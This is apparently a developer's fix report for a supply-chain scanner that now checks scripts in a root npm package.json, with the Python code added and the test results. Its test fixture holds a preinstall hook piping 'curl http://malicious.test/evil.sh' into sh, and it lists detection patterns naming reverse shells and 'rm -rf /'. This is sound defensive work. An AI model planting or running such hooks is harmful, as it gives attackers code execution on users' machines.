# Preinstall Script Detection - Fixed ✅

## Issue

The preinstall script detection was not working for packages with no dependencies. When analyzing `C:\Users\VISHAKHA\Downloads\vuln_samples\vuln_preinstall_script`, it reported 0 findings even though the package.json contained a malicious preinstall script:

```json
{
  "name": "vuln-preinstall",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "curl http://malicious.test/evil.sh | sh"
  }
}
```

## Root Cause

The hybrid analysis path (`analyze_project_hybrid`) only analyzed dependencies, not the root package.json scripts. The existing `_analyze_npm_scripts` function was available but not being called for the root package.

## Fix Applied

### File: `analyze_supply_chain.py`

Added Step 6.5 after rule-based detection to analyze root package.json scripts:

```python
# Step 6.5: Analyze root package.json scripts for malicious patterns (npm only)
if ecosystem == "npm":
    logger.info("Analyzing root package.json scripts...")
    try:
        import json
        with open(manifest_file, 'r', encoding='utf-8') as f:
            package_json = json.load(f)
        
        scripts = package_json.get('scripts', {})
        package_name = package_json.get('name', 'root-package')
        
        if scripts:
            from tools.sbom_tools import _analyze_npm_scripts
            script_findings = _analyze_npm_scripts(scripts, package_name)
            
            if script_findings:
                logger.warning(f"Found {len(script_findings)} malicious scripts in root package.json")
                # Convert SecurityFinding to Finding objects
                for sf in script_findings:
                    initial_findings.append(Finding(
                        package_name=sf.package,
                        package_version="1.0.0",
                        finding_type=sf.finding_type,
                        severity=sf.severity,
                        description=sf.evidence[0] if sf.evidence else "Malicious script detected",
                        detection_method="rule_based",
                        confidence=sf.confidence,
                        evidence={"source": sf.source, "details": sf.evidence},
                        remediation="; ".join(sf.recommendations) if sf.recommendations else None
                    ))
```

## How It Works

1. **After dependency analysis**: Once dependencies are analyzed, check if ecosystem is npm
2. **Load root package.json**: Read the manifest file to extract scripts
3. **Analyze scripts**: Use existing `_analyze_npm_scripts` function to detect malicious patterns
4. **Convert findings**: Transform SecurityFinding objects to Finding objects
5. **Add to results**: Append to initial_findings for inclusion in the report

## Detection Patterns

The `_analyze_npm_scripts` function detects various malicious patterns including:

- **Remote Code Execution**: `curl ... | sh`, `wget ... | bash`
- **Reverse Shells**: `bash -i >& /dev/tcp/...`
- **File Manipulation**: `rm -rf /`, file deletion
- **Privilege Escalation**: `sudo`, `chmod u+s`
- **Data Exfiltration**: Sending data to external servers
- **Obfuscation**: Base64 encoding, eval usage
- **Suspicious Network**: Unusual curl/wget patterns

## Test Results

### Before Fix
```bash
python main_github.py --local "C:\Users\VISHAKHA\Downloads\vuln_samples\vuln_preinstall_script" --ecosystem npm
```
**Result**: 0 findings ❌

### After Fix
```bash
python main_github.py --local "C:\Users\VISHAKHA\Downloads\vuln_samples\vuln_preinstall_script" --ecosystem npm
```
**Result**: 2 findings ✅

**Finding 1 (Critical):**
```
Type: malicious_script
Severity: critical
Description: Script: preinstall
Evidence:
  - Command: curl http://malicious.test/evil.sh | sh
  - Attack type: Remote code execution - downloads and executes code from internet
  - Lifecycle hook: ⚠️ RUNS AUTOMATICALLY on install
  - Pattern matched: remote_code_execution
```

**Finding 2 (High):**
```
Type: malicious_script
Severity: high
Description: Script: preinstall
Evidence:
  - Command: curl http://malicious.test/evil.sh | sh
  - Attack type: Suspicious network activity
  - Lifecycle hook: ⚠️ RUNS AUTOMATICALLY on install
  - Pattern matched: suspicious_network
```

## Lifecycle Scripts Analyzed

The detection covers all npm lifecycle scripts that run automatically:
- `preinstall` - Runs before package installation
- `install` - Runs during installation
- `postinstall` - Runs after installation
- `preuninstall` - Runs before uninstallation
- `uninstall` - Runs during uninstallation
- `postuninstall` - Runs after uninstallation

## UI Display

The findings now appear in the **Rule-Based Analysis - Security** section:

```
RULE-BASED ANALYSIS - SECURITY
[Statistics: 2 Total, 1 Critical, 1 High, 0 Medium, 0 Low]

vuln-preinstall v1.0.0 (2 issues)
1. Malicious script - Script: preinstall
   Command: curl http://malicious.test/evil.sh | sh
   Attack type: Remote code execution
   
2. Malicious script - Script: preinstall
   Command: curl http://malicious.test/evil.sh | sh
   Attack type: Suspicious network activity
```

## Files Modified

- `analyze_supply_chain.py` - Added Step 6.5 to analyze root package.json scripts

## Benefits

1. **Detects malicious scripts** in packages with no dependencies
2. **Analyzes root package** not just dependencies
3. **Automatic detection** of preinstall/postinstall attacks
4. **Pattern-based detection** for known attack vectors
5. **Detailed evidence** showing exact command and attack type

## Result

The system now successfully detects malicious preinstall scripts in the root package.json, providing critical security warnings before installation.
